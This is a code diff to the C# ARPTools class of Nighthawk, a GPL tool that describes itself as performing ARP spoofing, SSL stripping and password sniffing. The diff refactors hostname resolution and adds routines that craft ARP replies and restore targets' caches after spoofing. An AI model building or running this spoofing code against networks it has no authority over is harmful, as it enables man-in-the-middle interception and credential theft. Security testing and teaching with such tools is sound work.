@@ -8,6 +8,23 @@ using System.Threading;
 using SharpPcap;
 using PacketDotNet;
 
+/**
+Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
+Copyright (C) 2010  Klemen Bratec
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+**/
 namespace Nighthawk
 {
     /* ARP network scan & ARP spoofing */
@@ -18,7 +35,7 @@ namespace Nighthawk
 
         // status
         public bool ScanStarted = false;
-        private bool currentResolveHostnames = false;
+        public bool ResolveHostnames = false;
 
         public bool SpoofingStarted = false;
 
@@ -57,6 +74,15 @@ namespace Nighthawk
             if (OnArpScanComplete != null) OnArpScanComplete();
         }
 
+        // Hostname resolved event
+        public event HostnameResolvedHandler HostnameResolved;
+
+        private void Resolved(IPAddress ip, string hostname)
+        {
+            if (HostnameResolved != null) HostnameResolved(ip, hostname);
+        }
+
+
         // constructor
         public ARPTools(LivePcapDevice device)
         {
@@ -74,16 +100,16 @@ namespace Nighthawk
             long endIP = range[1];
             long currentIP = startIP;
 
-            var test = Network.LongToIP(startIP);
-
-            // start worker to listen for packets
-            ScanStarted = true;
-
             this.deviceInfo = deviceInfo;
+
+            ResolveHostnames = resolveHostnames;
 
             worker = new Thread(new ThreadStart(Worker));
             worker.Name = "ARP scan thread";
             worker.Start();
+
+            // start worker to listen for packets
+            ScanStarted = true;
 
             // loop through entire subnet, send ARP packets
             while (currentIP <= endIP)
@@ -93,12 +119,10 @@ namespace Nighthawk
 
                 currentIP++;
             }
-
-            currentResolveHostnames = resolveHostnames;
-
+            
             // timeout - wait for responses
             Timer waitTimer = new Timer(new TimerCallback(Timer_WaitOver));
-            waitTimer.Change((resolveHostnames ? 20000 : 4000), Timeout.Infinite);
+            waitTimer.Change((resolveHostnames ? 3000 : 3000), Timeout.Infinite);
         }
 
         // timer callback
@@ -121,9 +145,8 @@ namespace Nighthawk
             SpoofingTargets1 = targets1;
             SpoofingTarget2 = target2;
 
-            // set only target IPs
+            // create a new IP - MAC dictionary
             IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
-            
             SpoofingTargets1.ForEach(delegate(ARPTarget t) { IPtoMACTargets1.Add(t.IP, t.PMAC); });
             
             // change status
@@ -145,9 +168,12 @@ namespace Nighthawk
         {
             SpoofingStarted = false;
 
-            // stop thread
+            // stop threads
             workerSender.Abort();
             workerRouter.Abort();
+
+            // re-ARP targets
+            ReArpTargets();
         }
 
         // create ARP request packet
@@ -166,15 +192,21 @@ namespace Nighthawk
             return ethernetPacket;
         }
 
-        // create ARP replay packet
+        // create ARP replay packet - source MAC to device MAC
         private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
+        {
+            return GenerateARPReply(senderIP, targetIP, targetMAC, device.Interface.MacAddress);
+        }
+
+        // create ARP replay packet
+        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
         {
             // generate ethernet part - layer 1
             var ethernetPacket = new EthernetPacket(device.Interface.MacAddress, targetMAC,
                                                     EthernetPacketType.Arp);
 
             // arp data - layer 2
-            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), device.Interface.MacAddress,
+            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), sourceMAC,
                                        IPAddress.Parse(senderIP));
 
             ethernetPacket.PayloadPacket = arpPacket;
@@ -182,10 +214,24 @@ namespace Nighthawk
             return ethernetPacket;
         }
 
+        // send correct ARP entries back to targets
+        private void ReArpTargets()
+        {
+            foreach (ARPTarget target1 in SpoofingTargets1)
+            {
+                device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC));
+            }
+
+            foreach (ARPTarget target1 in SpoofingTargets1)
+            {
+                device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC));
+            }
+        }
+
         // worker function that parses ARP packets
         public void Worker()
         {
-            // loop
+            // main loop
             while (ScanStarted)
             {
                 // copy packets to threadQueue
@@ -210,21 +256,17 @@ namespace Nighthawk
                             // get IP, MAC
                             var ip = packet.SenderProtocolAddress;
                             var mac = packet.SenderHardwareAddress;
-                            var hostname = String.Empty;
-
-                            // resolve hostname
-                            if (currentResolveHostnames)
-                            {
-                                try
-                                {
-                                    hostname = Dns.GetHostEntry(ip).HostName;
-                                }
-                                catch
-                                {
-                                }
-                            }
+                            var hostname = ResolveHostnames ? "Resolving..." : String.Empty;
 
                             Response(ip, mac, hostname);
+                            
+                            // resolve hostname
+                            if (ResolveHostnames)
+                            {
+                                // start resolver thread
+                                var resolver = new Thread(new ParameterizedThreadStart(WorkerResolver));
+                                resolver.Start(ip);
+                            }
                         }
                     }
 
@@ -236,6 +278,8 @@ namespace Nighthawk
                     Thread.Sleep(50);
                 }
             }
+
+            return;
         }
 
         // worker function that sends ARP packets
@@ -259,6 +303,8 @@ namespace Nighthawk
                 // some timeout
                 Thread.Sleep(2000);
             }
+
+            return;
         }
 
         // worker function for routing packets
@@ -330,6 +376,26 @@ namespace Nighthawk
                     Thread.Sleep(50);
                 }
             }
+
+            return;
+        }
+
+        // worker function for resolving hostnames
+        public void WorkerResolver(object data)
+        {
+            var ip = (data as IPAddress);
+            var hostname = "";
+
+            Thread.Sleep(100);
+
+            try
+            {
+                hostname = Dns.GetHostEntry(ip).HostName;
+            }
+            catch {}
+
+            // invoke event
+            Resolved(ip, hostname);
         }
     }
     
@@ -338,4 +404,7 @@ namespace Nighthawk
 
     // ArpScanEventHandler event delegate
     public delegate void ArpScanEventHandler();
+
+    // HostnameResolved event delegate
+    public delegate void HostnameResolvedHandler(IPAddress ip, string hostname);
 }
